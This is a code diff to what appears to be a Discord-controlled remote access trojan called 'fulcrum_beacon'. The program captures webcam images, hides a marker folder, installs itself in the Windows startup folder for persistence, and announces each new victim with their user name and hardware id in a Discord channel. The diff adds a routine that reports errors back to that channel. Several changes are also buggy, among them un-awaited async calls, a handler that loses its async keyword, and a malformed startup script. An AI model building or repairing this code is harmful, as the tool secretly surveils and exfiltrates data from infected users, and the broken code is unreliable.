@@ -43,7 +43,7 @@ async def on_ready():
 
 # Event handler for when a message is sent in a channel the bot has access to
 @client.event
-async def on_message(message):
+def on_message(message):
     global profile_data
     if not profile_data:
         with open("profile.json", "r") as json_file:
@@ -68,28 +68,43 @@ async def on_message(message):
 def check_for_vm():
     return False
 
-def take_picture(cam_index):
+
+async def return_error_to_channel(error_message):
+    try:
+        with open("profile.json", "r") as json_file:
+            profile_data = json.load(json_file)
+        channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
+        if channel is not None:
+            await channel.send("'''" + error_message + "'''")
+        else:
+            print("No channel")
+    finally:
+        print("error returning error")
+
+def take_picture(cam_index=0):
     print("-TP")
     try:
         cam = cv2.VideoCapture(cam_index)
-        frame = cam.read()
-        cv2.imwrite("frame", frame)
+        ret, frame = cam.read()
+        cv2.imwrite("captured_frame.jpg", frame)
         cam.release()
-    except:
-        print("error taking picture")
+    except Exception as e:
+        return_error_to_channel(e)
 
 def create_flag():
     try:
         os.mkdir(FLAG_PATH)
         FILE_ATTRIBUTE_HIDDEN = 0x02
         ctypes.windll.kernel32.SetFileAttributesW(FLAG_PATH, FILE_ATTRIBUTE_HIDDEN)
-    except:
-        return
+    except Exception as e:
+        return_error_to_channel(e)
+
 
 def check_flags():
     if os.path.isdir(FLAG_PATH):
         return True
     return False
+
 
 def get_persistence():
     # benutzten des windows user startup folders
@@ -99,8 +114,9 @@ def get_persistence():
                 f.write('@echo off /n{os.path.join(START_FOLDER, "fulcrum_beacon.py")}')
             elif os.path.isfile(os.path.join(START_FOLDER, "fulcrum_beacon.exe")):
                 f.write('@echo off /n{os.path.join(START_FOLDER, "fulcrum_beacon.exe")}')
-    except:
-        return
+    except Exception as e:
+        return_error_to_channel(e)
+
 
 def create_unique_profile():
     c = wmi.WMI()
@@ -134,8 +150,8 @@ async def periodic_update_loop():
 
                 await new_channel.send("***NEW BEACON CONNECTED***")
                 await new_channel.send(f'user name: {profile_data["user_name"]}\nhardware id: {profile_data["hardware_id"]}')
-            except:
-                print("creating channel error")
+            except Exception as e:
+                await return_error_to_channel(e)
 
 
 def main():
